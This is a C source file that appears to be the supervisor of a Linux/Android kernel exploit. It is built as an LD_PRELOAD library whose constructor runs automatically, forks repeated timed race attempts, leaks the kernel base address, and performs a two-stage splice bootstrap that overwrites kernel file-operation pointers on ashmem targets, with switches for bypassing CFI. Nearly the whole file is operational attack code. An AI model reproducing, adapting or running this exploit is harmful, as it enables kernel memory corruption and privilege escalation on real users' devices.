#include "common.h"

#ifndef DEFAULT_EXPLOIT_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define DEFAULT_EXPLOIT_ATTEMPTS 24
#else
#define DEFAULT_EXPLOIT_ATTEMPTS 16
#endif
#endif
#define DEFAULT_PSELECT_DELAY_USEC 20000
#ifndef DEFAULT_ATTEMPT_TIMEOUT_SEC
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
#endif
#ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
#endif
#define APP_MIN_BOOT_UPTIME_SEC 60

#if defined(APP_PAYLOAD) && APP_PAYLOAD
struct app_p0_shared_state {
  atomic_int dirty;
  atomic_int ready;
  _Atomic uintptr_t offset;
  _Atomic uintptr_t gate_page_struct;
  _Atomic uintptr_t probe_page_struct;
  atomic_int two_stage1_ready;
  atomic_int two_stage2_ready;
  atomic_int two_stage_splice_done;
  _Atomic ssize_t two_stage_splice_ret;
  uintptr_t two_stage_installed_fops;
  uintptr_t two_stage_target_fop;
  uintptr_t two_stage_control_fop;
  uint64_t two_stage_original_fops;
  unsigned char two_stage_target_region[32];
  uint64_t two_stage_original_flags_mode;
  uint64_t two_stage_bootstrap_flags_mode;
};

static struct app_p0_shared_state *app_p0_state;
static int app_two_stage_data_write_fd = -1;
static int app_two_stage_result_read_fd = -1;

void app_publish_p0_offset(uintptr_t offset) {
  if (!app_p0_state) {
    return;
  }
  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
  atomic_store(&app_p0_state->offset, offset);
  atomic_store(&app_p0_state->ready, 1);
}

void app_publish_p0_dirty(void) {
  if (!app_p0_state) {
    return;
  }
  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
  atomic_store(&app_p0_state->dirty, 1);
}

void app_publish_two_stage1(uintptr_t installed_fops,
                            uintptr_t target_fop,
                            uintptr_t control_fop,
                            uint64_t original_fops,
                            const unsigned char target_region[32],
                            uint64_t original_flags_mode,
                            uint64_t bootstrap_flags_mode) {
  if (!app_p0_state) return;
  app_p0_state->two_stage_installed_fops = installed_fops;
  app_p0_state->two_stage_target_fop = target_fop;
  app_p0_state->two_stage_control_fop = control_fop;
  app_p0_state->two_stage_original_fops = original_fops;
  memcpy(app_p0_state->two_stage_target_region, target_region, 32);
  app_p0_state->two_stage_original_flags_mode = original_flags_mode;
  app_p0_state->two_stage_bootstrap_flags_mode = bootstrap_flags_mode;
  atomic_store(&app_p0_state->two_stage1_ready, 1);
}

void app_publish_two_stage2_ready(void) {
  if (app_p0_state) atomic_store(&app_p0_state->two_stage2_ready, 1);
}

int app_trigger_two_stage_splice(void) {
  if (!app_p0_state || app_two_stage_data_write_fd < 0 ||
      app_two_stage_result_read_fd < 0) {
    return 0;
  }
  uint64_t desired = app_p0_state->two_stage_bootstrap_flags_mode;
  ssize_t put = write(app_two_stage_data_write_fd, &desired,
                      sizeof(desired));
  ssize_t splice_ret = -1;
  ssize_t got = read(app_two_stage_result_read_fd, &splice_ret,
                     sizeof(splice_ret));
  if (put != (ssize_t)sizeof(desired) ||
      got != (ssize_t)sizeof(splice_ret)) {
    splice_ret = -1;
  }
  atomic_store(&app_p0_state->two_stage_splice_ret, splice_ret);
  atomic_store(&app_p0_state->two_stage_splice_done, 1);
  pr_info("two-stage direct splice bootstrap put=%zd got=%zd ret=%zd\n",
          put, got, splice_ret);
  return splice_ret == (ssize_t)sizeof(uint64_t);
}

int app_wait_two_stage_splice(ssize_t *splice_ret) {
  if (!app_p0_state) return 0;
  while (!atomic_load(&app_p0_state->two_stage_splice_done)) usleep(10000);
  *splice_ret = atomic_load(&app_p0_state->two_stage_splice_ret);
  return 1;
}

int app_get_two_stage_state(uintptr_t *installed_fops,
                            uintptr_t *target_fop,
                            uint64_t *original_fops,
                            unsigned char target_region[32],
                            uint64_t *original_flags_mode,
                            uint64_t *bootstrap_flags_mode) {
  if (!app_p0_state || !atomic_load(&app_p0_state->two_stage1_ready)) return 0;
  *installed_fops = app_p0_state->two_stage_installed_fops;
  *target_fop = app_p0_state->two_stage_target_fop;
  *original_fops = app_p0_state->two_stage_original_fops;
  memcpy(target_region, app_p0_state->two_stage_target_region, 32);
  *original_flags_mode = app_p0_state->two_stage_original_flags_mode;
  *bootstrap_flags_mode = app_p0_state->two_stage_bootstrap_flags_mode;
  return 1;
}

#elif defined(APP_PAYLOAD) && APP_PAYLOAD
/* slide_app.c publishes these notifications for every app payload.  Targets
 * without a physical-P0 candidate bank have no shared P0 supervisor state,
 * so keep the ABI complete with deliberate no-op implementations. */
void app_publish_p0_offset(uintptr_t offset) {
  (void)offset;
}

void app_publish_p0_dirty(void) {
}

void app_publish_two_stage1(uintptr_t installed_fops,
                            uintptr_t target_fop,
                            uintptr_t control_fop,
                            uint64_t original_fops,
                            const unsigned char target_region[32],
                            uint64_t original_flags_mode,
                            uint64_t bootstrap_flags_mode) {
  (void)installed_fops; (void)target_fop; (void)control_fop;
  (void)original_fops; (void)target_region; (void)original_flags_mode;
  (void)bootstrap_flags_mode;
}
void app_publish_two_stage2_ready(void) {}
int app_trigger_two_stage_splice(void) { return 0; }
int app_wait_two_stage_splice(ssize_t *splice_ret) {
  (void)splice_ret;
  return 0;
}
int app_get_two_stage_state(uintptr_t *installed_fops,
                            uintptr_t *target_fop,
                            uint64_t *original_fops,
                            unsigned char target_region[32],
                            uint64_t *original_flags_mode,
                            uint64_t *bootstrap_flags_mode) {
  (void)installed_fops; (void)target_fop; (void)original_fops;
  (void)target_region; (void)original_flags_mode; (void)bootstrap_flags_mode;
  return 0;
}

#endif

#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
void app_publish_p0_offset(uintptr_t offset) { (void)offset; }
void app_publish_p0_dirty(void) {}
void app_publish_two_stage1(uintptr_t installed_fops,
                            uintptr_t target_fop,
                            uintptr_t control_fop,
                            uint64_t original_fops,
                            const unsigned char target_region[32],
                            uint64_t original_flags_mode,
                            uint64_t bootstrap_flags_mode) {
  (void)installed_fops; (void)target_fop; (void)control_fop;
  (void)original_fops; (void)target_region; (void)original_flags_mode;
  (void)bootstrap_flags_mode;
}
void app_publish_two_stage2_ready(void) {}
int app_trigger_two_stage_splice(void) { return 0; }
int app_wait_two_stage_splice(ssize_t *splice_ret) {
  (void)splice_ret;
  return 0;
}
int app_get_two_stage_state(uintptr_t *installed_fops,
                            uintptr_t *target_fop,
                            uint64_t *original_fops,
                            unsigned char target_region[32],
                            uint64_t *original_flags_mode,
                            uint64_t *bootstrap_flags_mode) {
  (void)installed_fops; (void)target_fop; (void)original_fops;
  (void)target_region; (void)original_flags_mode; (void)bootstrap_flags_mode;
  return 0;
}
#endif

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec_sweep(int attempt, int *delay_out) {
  const char *value = getenv("PSELECT_DELAY_USEC_SWEEP_RUNTIME");
  if (!value || !*value) {
    return 0;
  }

  int values[64];
  int count = 0;
  const char *p = value;
  while (*p && count < (int)(sizeof(values) / sizeof(values[0]))) {
    char *end = NULL;
    errno = 0;
    long parsed = strtol(p, &end, 0);
    if (errno || end == p || parsed < 0 || parsed > 1000000L) {
      break;
    }
    values[count++] = (int)parsed;
    p = end;
    if (*p == ',') {
      p++;
      continue;
    }
    if (*p) {
      break;
    }
  }
  if (count <= 0) {
    return 0;
  }

  *delay_out = values[(attempt - 1) % count];
  return 1;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  int runtime_delay = 0;
  if (attempt_delay_usec_sweep(attempt, &runtime_delay)) {
    return runtime_delay;
  }
  if (getenv("PSELECT_SUPERVISOR_FIXED_DELAY_RUNTIME")) {
    (void)attempt;
    return base_delay < 0 ? 0 : base_delay;
  }
#if defined(PSELECT_SUPERVISOR_ATTEMPT_DELAYS_USEC)
  static const int delays[] = {
    PSELECT_SUPERVISOR_ATTEMPT_DELAYS_USEC
  };
  (void)base_delay;
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  int delay = delays[(attempt - 1) % count];
#elif defined(APP_PAYLOAD_ATTEMPT_DELAYS_USEC)
  static const int delays[] = {
    APP_PAYLOAD_ATTEMPT_DELAYS_USEC
  };
  (void)base_delay;
  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  int delay = delays[(attempt - 1) % count];
#else
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  static const int offsets[] = {
    5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
  };
#else
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
#endif
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
#endif
  return delay < 0 ? 0 : delay;
}

static int attempt_pre_ctx_delta(int attempt, long *delta_out) {
  const char *value = getenv("PRE_CTX_MM_DELTA_SWEEP_RUNTIME");
  if (!value || !*value) {
    return 0;
  }

  long values[64];
  int count = 0;
  const char *p = value;
  while (*p && count < (int)(sizeof(values) / sizeof(values[0]))) {
    char *end = NULL;
    errno = 0;
    long parsed = strtol(p, &end, 0);
    if (errno || end == p || parsed < -64 || parsed > 64) {
      break;
    }
    values[count++] = parsed;
    p = end;
    if (*p == ',') {
      p++;
      continue;
    }
    if (*p) {
      break;
    }
  }
  if (count <= 0) {
    return 0;
  }

  *delta_out = values[(attempt - 1) % count];
  return 1;
}

static int attempt_pre_ctx_count(int attempt, unsigned long *count_out) {
  const char *value = getenv("PRE_CTX_MM_COUNT_SWEEP_RUNTIME");
  if (!value || !*value) {
    return 0;
  }

  unsigned long values[64];
  int count = 0;
  const char *p = value;
  while (*p && count < (int)(sizeof(values) / sizeof(values[0]))) {
    char *end = NULL;
    errno = 0;
    unsigned long parsed = strtoul(p, &end, 0);
    if (errno || end == p || parsed < 1 || parsed > 4096) {
      break;
    }
    values[count++] = parsed;
    p = end;
    if (*p == ',') {
      p++;
      continue;
    }
    if (*p) {
      break;
    }
  }
  if (count <= 0) {
    return 0;
  }

  *count_out = values[(attempt - 1) % count];
  return 1;
}


static int attempt_post_ready_delay_nsec(
    int attempt, unsigned long long *delay_out) {
  const char *value = getenv("PSELECT_POST_READY_DELAY_NSEC_SWEEP_RUNTIME");
  if (!value || !*value) {
    return 0;
  }

  unsigned long long values[64];
  int count = 0;
  const char *p = value;
  while (*p && count < (int)(sizeof(values) / sizeof(values[0]))) {
    char *end = NULL;
    errno = 0;
    unsigned long long parsed = strtoull(p, &end, 0);
    if (errno || end == p || parsed > 1000000000ULL) {
      break;
    }
    values[count++] = parsed;
    p = end;
    if (*p == ',') {
      p++;
      continue;
    }
    if (*p) {
      break;
    }
  }
  if (count <= 0) {
    return 0;
  }

  *delay_out = values[(attempt - 1) % count];
  return 1;
}

static int attempt_post_ready_spin_iters(int attempt, long *spin_out) {
  const char *value = getenv("PSELECT_POST_READY_SPIN_ITERS_SWEEP_RUNTIME");
  if (!value || !*value) {
    return 0;
  }

  long values[64];
  int count = 0;
  const char *p = value;
  while (*p && count < (int)(sizeof(values) / sizeof(values[0]))) {
    char *end = NULL;
    errno = 0;
    long parsed = strtol(p, &end, 0);
    if (errno || end == p || parsed < 0 || parsed > 1000000L) {
      break;
    }
    values[count++] = parsed;
    p = end;
    if (*p == ',') {
      p++;
      continue;
    }
    if (*p) {
      break;
    }
  }
  if (count <= 0) {
    return 0;
  }

  *spin_out = values[(attempt - 1) % count];
  return 1;
}

static int attempt_cfi_armed(int attempt, int *armed_out) {
  const char *value = getenv("PSELECT_CFI_ARM_ATTEMPTS_RUNTIME");
  if (!value || !*value) {
    value = getenv("PSELECT_CFI_ARM_ATTEMPT_RUNTIME");
  }
  if (!value || !*value) {
    return 0;
  }

  *armed_out = 0;
  const char *p = value;
  while (*p) {
    char *end = NULL;
    errno = 0;
    long parsed = strtol(p, &end, 0);
    if (errno || end == p || parsed < 1 || parsed > 64) {
      break;
    }
    if (parsed == attempt) {
      *armed_out = 1;
    }
    p = end;
    if (*p == ',') {
      p++;
      continue;
    }
    if (*p) {
      break;
    }
  }

  return 1;
}

static void wait_for_boot_quiet_window(void) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  struct timespec uptime;
  SYSCHK(clock_gettime(CLOCK_BOOTTIME, &uptime));
  if (uptime.tv_sec < APP_MIN_BOOT_UPTIME_SEC) {
    time_t wait_sec = APP_MIN_BOOT_UPTIME_SEC - uptime.tv_sec;
    pr_info("waiting for boot allocator quiet window seconds=%lld uptime=%lld\n",
            (long long)wait_sec, (long long)uptime.tv_sec);
    while (wait_sec > 0) {
      wait_sec = sleep((unsigned int)wait_sec);
    }
  }
#endif
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();
  wait_for_boot_quiet_window();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  int attempt_timeout_sec = env_int(
      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
  int p0_attempt_timeout_sec = env_int(
      "P0_ATTEMPT_TIMEOUT_SEC", DEFAULT_P0_ATTEMPT_TIMEOUT_SEC, 5,
      attempt_timeout_sec);
  if (p0_attempt_timeout_sec > attempt_timeout_sec) {
    p0_attempt_timeout_sec = attempt_timeout_sec;
  }
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

  /* Measure the shared open file once in the supervisor.  The high fd and
   * the resolved struct file pointer survive fork, so race attempts do no
   * perf sampling or ioctl burst of their own. */
  if (getenv("PSELECT_PREOPEN_FILE_FOPS_SUPERVISOR")) {
    init_ashmem_path();
    if (!slide_leak_kernel_base() ||
        !prepare_preopened_ashmem_file_target()) {
      pr_error("supervisor preopened file target preparation failed\n");
      _exit(1);
    }
    pr_success("supervisor retained file target fd across attempts\n");
  }

#if defined(APP_PAYLOAD) && APP_PAYLOAD
  app_p0_state = mmap(NULL, sizeof(*app_p0_state), PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (app_p0_state == MAP_FAILED) {
    pr_error("app p0 shared state mmap failed errno=%d\n", errno);
    _exit(1);
  }
#endif

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};
  pid_t two_stage1_holder = -1;
  pid_t two_stage_splice_child = -1;
  int two_stage_data_pipe[2] = {-1, -1};
  int two_stage_result_pipe[2] = {-1, -1};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d "
             "p0_timeout=%d timeout=%d\n",
             getpid(), max_attempts, base_delay, p0_attempt_timeout_sec,
             attempt_timeout_sec);

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
      char attempt_arg[16];
      snprintf(attempt_arg, sizeof(attempt_arg), "%d", attempt);
      SYSCHK(setenv("EXPLOIT_ATTEMPT_INDEX", attempt_arg, 1));
      int cfi_armed = 0;
      if (attempt_cfi_armed(attempt, &cfi_armed)) {
        SYSCHK(setenv("PSELECT_SKIP_CFI_AFTER_ORACLE",
                      cfi_armed ? "0" : "1", 1));
        pr_info("attempt cfi armed=%d source=runtime\n", cfi_armed);
      }
      long pre_ctx_delta = 0;
      if (attempt_pre_ctx_delta(attempt, &pre_ctx_delta)) {
        char delta_arg[16];
        snprintf(delta_arg, sizeof(delta_arg), "%ld", pre_ctx_delta);
        SYSCHK(setenv("PRE_CTX_MM_DELTA_RUNTIME", delta_arg, 1));
        pr_info("attempt pre_ctx delta=%ld source=sweep\n",
                pre_ctx_delta);
      }
      unsigned long pre_ctx_count = 0;
      if (attempt_pre_ctx_count(attempt, &pre_ctx_count)) {
        char count_arg[32];
        snprintf(count_arg, sizeof(count_arg), "%lu", pre_ctx_count);
        SYSCHK(setenv("PRE_CTX_MM_COUNT_RUNTIME", count_arg, 1));
        pr_info("attempt pre_ctx count=%lu source=sweep\n",
                pre_ctx_count);
      }
      unsigned long long post_ready_delay = 0;
      if (attempt_post_ready_delay_nsec(attempt, &post_ready_delay)) {
        char post_ready_arg[32];
        snprintf(post_ready_arg, sizeof(post_ready_arg), "%llu",
                 post_ready_delay);
        SYSCHK(setenv("PSELECT_POST_READY_DELAY_NSEC",
                      post_ready_arg, 1));
        pr_info("attempt post_ready_delay_nsec=%llu source=sweep\n",
                post_ready_delay);
      }
      long post_ready_spin = 0;
      if (attempt_post_ready_spin_iters(attempt, &post_ready_spin)) {
        char post_ready_spin_arg[32];
        snprintf(post_ready_spin_arg, sizeof(post_ready_spin_arg), "%ld",
                 post_ready_spin);
        SYSCHK(setenv("PSELECT_POST_READY_SPIN_ITERS",
                      post_ready_spin_arg, 1));
        pr_info("attempt post_ready_spin_iters=%ld source=sweep\n",
                post_ready_spin);
      }
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      const char *forced_offset = getenv("SLIDE_P0_OFFSET");
      if (forced_offset) {
        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
                   attempt, max_attempts, getpid(), delay_usec,
                   forced_offset);
      } else {
        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
                   attempt, max_attempts, getpid(), delay_usec);
      }
#else
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
#endif
      _exit(run_exploit(1, argv));
    }

    int status = 0;
    pid_t waited = 0;
    int retained_stage1 = 0;
    struct timespec started;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited < 0 && errno != EINTR) {
        break;
      }

#if defined(APP_PAYLOAD) && APP_PAYLOAD
      if (getenv("PSELECT_TWO_STAGE_SPLICE") &&
          !getenv("PSELECT_TWO_STAGE2") &&
          atomic_load(&app_p0_state->two_stage1_ready)) {
        two_stage1_holder = child;
        retained_stage1 = 1;
        pr_success("two-stage supervisor retained stage1 holder pid=%d\n",
                   child);
        break;
      }
#endif

      struct timespec now;
      SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
      time_t elapsed = now.tv_sec - started.tv_sec;
      int timeout_sec = attempt_timeout_sec;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      if (!getenv("SLIDE_P0_OFFSET") &&
          !atomic_load(&app_p0_state->ready)) {
        timeout_sec = p0_attempt_timeout_sec;
      }
#endif
      if (elapsed >= timeout_sec) {
        pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
                   attempt, max_attempts, child, timeout_sec);
        SYSCHK(kill(child, SIGKILL));
        do {
          waited = waitpid(child, &status, 0);
        } while (waited < 0 && errno == EINTR);
        break;
      }
      usleep(100000);
    }
#if defined(APP_PAYLOAD) && APP_PAYLOAD
    if (getenv("PSELECT_TWO_STAGE_SPLICE") &&
        !getenv("PSELECT_TWO_STAGE2") &&
        atomic_load(&app_p0_state->two_stage1_ready) &&
        !retained_stage1) {
      retained_stage1 = 1;
      two_stage1_holder = -1;
      pr_success("two-stage supervisor observed detached stage1 holder\n");
    }
#endif
    if (retained_stage1) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      if (pipe2(two_stage_data_pipe, O_CLOEXEC) != 0 ||
          pipe2(two_stage_result_pipe, O_CLOEXEC) != 0) {
        pr_error("two-stage splice pipe setup failed errno=%d\n", errno);
        break;
      }
      two_stage_splice_child = fork();
      if (two_stage_splice_child == 0) {
        close(two_stage_data_pipe[1]);
        close(two_stage_result_pipe[0]);
        loff_t out_pos = 0;
        ssize_t splice_ret = splice(two_stage_data_pipe[0], NULL, 448,
                                    &out_pos, sizeof(uint64_t), 0);
        (void)write(two_stage_result_pipe[1], &splice_ret,
                    sizeof(splice_ret));
        _exit(0);
      }
      close(two_stage_data_pipe[0]);
      close(two_stage_result_pipe[1]);
      app_two_stage_data_write_fd = two_stage_data_pipe[1];
      app_two_stage_result_read_fd = two_stage_result_pipe[0];
      usleep(300000);
      int splice_status = 0;
      if (two_stage_splice_child < 0 ||
          waitpid(two_stage_splice_child, &splice_status, WNOHANG) != 0) {
        pr_error("two-stage splice failed to block pid=%d errno=%d\n",
                 two_stage_splice_child, errno);
        break;
      }
      uintptr_t slide = (uintptr_t)strtoull(getenv("SLIDE_P0_OFFSET"),
                                            NULL, 0);
      uintptr_t global = KIMAGE_TEXT_BASE + slide +
                         ASHMEM_MISC_FOPS_OFF;
      uintptr_t mode_target =
          app_p0_state->two_stage_target_fop + 0x18;
      intptr_t delta = (intptr_t)(mode_target - global);
      char delta_arg[32];
      char installed_arg[32];
      snprintf(delta_arg, sizeof(delta_arg), "%" PRIdPTR, delta);
      snprintf(installed_arg, sizeof(installed_arg), "0x%" PRIxPTR,
               app_p0_state->two_stage_installed_fops);
      SYSCHK(setenv("ASHMEM_MISC_FOPS_DELTA_RUNTIME", delta_arg, 1));
      SYSCHK(setenv("OLD_FILETARGET_INSTALLED_FAKE_FOPS",
                    installed_arg, 1));
      SYSCHK(setenv("PSELECT_TWO_STAGE2", "1", 1));
      int stage2_attempts = env_int(
          "TWO_STAGE2_ATTEMPTS", 12, 1, 32);
      max_attempts = attempt + stage2_attempts;
      pr_success("two-stage splice blocked pid=%d mode_target=%016zx "
                 "delta=%" PRIdPTR " installed_fops=%s "
                 "stage2_attempts=%d total_limit=%d\n",
                 two_stage_splice_child, mode_target, delta, installed_arg,
                 stage2_attempts, max_attempts);
      continue;
#endif
    }
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      if (two_stage1_holder > 0) {
        kill(two_stage1_holder, SIGKILL);
        waitpid(two_stage1_holder, NULL, 0);
        two_stage1_holder = -1;
      }
      if (two_stage_splice_child > 0) {
        waitpid(two_stage_splice_child, NULL, 0);
        two_stage_splice_child = -1;
      }
#endif
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

#if defined(APP_PAYLOAD) && APP_PAYLOAD
    if (!getenv("SLIDE_P0_OFFSET") &&
        atomic_load(&app_p0_state->ready)) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
      pr_error("fresh P0 session was consumed by the failed child; "
               "refusing cross-process retry, reboot required\n");
      break;
#else
      uintptr_t offset = atomic_load(&app_p0_state->offset);
      uintptr_t gate_page = atomic_load(&app_p0_state->gate_page_struct);
      uintptr_t probe_page = atomic_load(&app_p0_state->probe_page_struct);
      char offset_arg[16];
      char gate_page_arg[24];
      char probe_page_arg[24];
      snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
      snprintf(gate_page_arg, sizeof(gate_page_arg), "0x%zx", gate_page);
      snprintf(probe_page_arg, sizeof(probe_page_arg), "0x%zx", probe_page);
      SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
      SYSCHK(setenv("P0_GATE_PAGE_STRUCT", gate_page_arg, 1));
      SYSCHK(setenv("P0_PROBE_PAGE_STRUCT", probe_page_arg, 1));
      pr_success("supervisor retained p0_offset=%s gate=%s probe=%s\n",
                 offset_arg, gate_page_arg, probe_page_arg);
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    } else if (!getenv("SLIDE_P0_OFFSET") &&
               atomic_load(&app_p0_state->dirty)) {
      pr_error("p0 oracle dirtied before slide discovery; refusing unsafe retry\n");
#else
    } else if (atomic_load(&app_p0_state->dirty)) {
      pr_error("p0 oracle state dirty or uncertain; refusing unsafe retry\n");
#endif
      break;
    }
#endif

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                  WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
#if defined(APP_PAYLOAD) && APP_PAYLOAD
    if (attempt < max_attempts) {
      int retry_delay = env_int("EXPLOIT_RETRY_DELAY_SEC", 0, 0, 10);
      pr_info("safe retry quiet delay seconds=%d\n", retry_delay);
      sleep((unsigned int)retry_delay);
    }
#endif
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  if (two_stage1_holder > 0) {
    pr_error("two-stage stage1 remains installed; retaining supervisor and "
             "holder until external reboot\n");
    for (;;) pause();
  }
#endif
  _exit(1);
}
